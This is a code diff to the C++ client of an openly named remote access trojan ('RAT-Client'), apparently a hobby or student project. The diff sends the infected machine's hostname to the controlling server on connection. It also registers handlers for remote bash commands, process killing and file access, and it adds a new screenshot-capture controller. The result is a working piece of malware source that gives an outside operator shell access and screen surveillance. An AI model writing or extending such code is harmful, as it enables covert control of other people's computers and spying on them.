@@ -3,6 +3,7 @@
 #include "ClientBashController.hpp"
 #include "ClientKillController.hpp"
 #include "ClientFileController.hpp"
+#include "ClientScreenshotController.hpp"
 #include <iostream>
 #include <thread>
 #include <cstdio>
@@ -44,6 +45,23 @@ bool ClientManager::connectTo(const std::string &name, const sf::IpAddress &addr
     
     socket_ = std::make_shared<Utils::TCPSocket>();
     if (!socket_->connect(address, port)) {
+        socket_.reset();
+        return false;
+    }
+    
+    // Send initial handshake with hostname immediately after connecting
+    nlohmann::json handshake;
+    handshake["controller"] = "system";
+    handshake["msg"] = "Hello from RAT-Client";
+    handshake["version"] = "1.0";
+    char hostname[256] = {0};
+    if (gethostname(hostname, sizeof(hostname)) == 0) {
+        handshake["hostname"] = std::string(hostname);
+    }
+    
+    std::string jsonStr = handshake.dump();
+    if (!socket_->send(jsonStr)) {
+        socket_->close();
         socket_.reset();
         return false;
     }
@@ -92,24 +110,12 @@ int ClientManager::run(const sf::IpAddress &address, unsigned short port) {
     ClientController *ctrl = getController(name);
     if (!ctrl) return 2;
 
-    // Trimitere mesaj inițial cu informații despre client
-    nlohmann::json out;
-    out["controller"] = "system";
-    out["msg"] = "Hello from RAT-Client";
-    out["version"] = "1.0";
-    char hostname[256] = {0};
-    if (gethostname(hostname, sizeof(hostname)) == 0) {
-        out["hostname"] = std::string(hostname);
-    }
-    if (!ctrl->sendJson(out)) {
-        disconnect(name);
-        return 3;
-    }
-
+    // Handshake already sent in connectTo(), just set up controllers
     std::map<std::string, std::unique_ptr<IClientController>> clientControllers;
     clientControllers["bash"] = std::make_unique<ClientBashController>();
     clientControllers["kill"] = std::make_unique<ClientKillController>();
     clientControllers["file"] = std::make_unique<ClientFileController>();
+    clientControllers["screenshot"] = std::make_unique<ClientScreenshotController>();
 
     while (isConnected(name)) {
         nlohmann::json in;
